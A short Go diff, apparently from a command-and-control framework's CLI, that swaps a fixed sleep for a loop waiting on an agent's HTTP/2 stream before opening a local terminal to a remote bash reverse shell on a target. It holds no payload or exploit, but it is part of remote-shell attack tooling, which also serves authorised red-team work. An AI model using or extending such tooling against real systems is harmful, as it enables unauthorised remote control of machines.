@@ -194,7 +194,14 @@ shell:
 				CliPrintError("Cannot activate reverse shell on remote target: ", err)
 				return
 			}
-			time.Sleep(1 * time.Second)
+			// wait for agent to send shell
+			for {
+				if agent.H2Stream.Ctx != nil && agent.H2Stream.Conn != nil {
+					break
+				}
+				time.Sleep(200 * time.Millisecond)
+			}
+
 			// launch local terminal to use remote bash shell
 			send := make(chan []byte)
 			reverseBash(agent.H2Stream.Ctx, send, RecvAgent)
